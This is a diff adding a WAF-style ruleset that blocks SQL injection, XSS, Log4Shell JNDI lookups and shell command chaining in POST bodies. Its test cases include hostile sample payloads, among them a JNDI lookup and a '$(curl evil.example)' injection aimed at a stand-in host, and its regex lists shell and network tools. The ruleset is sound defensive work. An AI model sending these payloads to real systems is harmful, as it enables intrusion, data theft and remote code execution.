@@ -1,0 +1,55 @@
+# Cloudveil body ruleset - opt in with `rulesets: [core, core-body]`.
+#
+# These look at the request body, which means the edge buffers up to
+# `max_body_bytes` on every request to the zone. That's the cost; the benefit is
+# catching payloads that arrive in a POST instead of a query string.
+#
+# Bodies are inspected as sent, without percent-decoding, since a body may be JSON,
+# multipart, or anything else. Form-encoded payloads therefore need patterns that
+# tolerate `+` and `%xx`.
+
+rules:
+  - id: sqli-union-select-body
+    description: UNION SELECT in a posted body
+    action: block
+    severity: high
+    expression: >-
+      http.request.body matches "(?i)\bunion(\s|\+|%20)+(all(\s|\+|%20)+)?select\b"
+    tests:
+      - { method: POST, body: "id=1 UNION SELECT password FROM users", expect: match }
+      - { method: POST, body: "id=1+union+select+1", expect: match }
+      - { method: POST, body: '{"q":"union select *"}', expect: match }
+      - { method: POST, body: "id=42&name=ada", expect: nomatch }
+      - { method: POST, body: "topic=reunion selections", expect: nomatch }
+
+  - id: xss-script-tag-body
+    description: A script tag posted in a body
+    action: block
+    severity: high
+    expression: >-
+      http.request.body matches "(?i)<\s*script\b|%3c\s*script\b"
+    tests:
+      - { method: POST, body: "comment=<script>alert(1)</script>", expect: match }
+      - { method: POST, body: "comment=%3Cscript%3Ealert(1)%3C/script%3E", expect: match }
+      - { method: POST, body: "comment=nice article about the script tag", expect: nomatch }
+
+  - id: log4shell-jndi-body
+    description: JNDI lookup strings in a body, per CVE-2021-44228
+    action: block
+    severity: critical
+    expression: >-
+      http.request.body matches "(?i)\$\{jndi:"
+    tests:
+      - { method: POST, body: '{"user":"${jndi:ldap://evil.example/a}"}', expect: match }
+      - { method: POST, body: '{"user":"ada"}', expect: nomatch }
+
+  - id: shell-injection-body
+    description: Command chaining into a shell builtin, in a body
+    action: block
+    severity: critical
+    expression: >-
+      http.request.body matches "(?i)(;|\|\||&&|`|\$\()\s*(cat|ls|curl|wget|nc|bash|sh|whoami|id|uname)\b"
+    tests:
+      - { method: POST, body: "host=1.1.1.1; cat /etc/hostname", expect: match }
+      - { method: POST, body: "cmd=$(curl evil.example)", expect: match }
+      - { method: POST, body: "sort=id&dir=asc", expect: nomatch }
